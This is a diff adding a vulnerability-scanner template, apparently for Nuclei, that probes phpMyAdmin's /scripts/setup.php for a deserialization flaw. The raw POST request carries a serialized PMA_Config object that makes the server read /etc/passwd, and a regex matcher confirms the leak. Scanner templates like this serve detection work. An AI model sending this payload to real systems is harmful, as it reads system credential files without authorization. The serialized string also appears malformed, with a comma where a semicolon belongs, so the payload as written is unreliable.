@@ -1,0 +1,25 @@
+id: phpmyadmin-setup-deserialization
+info:
+  name: PhpMyAdmin Setup Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: deserialization
+  description: |
+    This template checks for a deserialization vulnerability in the setup.php script of PhpMyAdmin that may leak sensitive files like /etc/passwd.
+http:
+  - raw:
+      - |
+        POST /scripts/setup.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
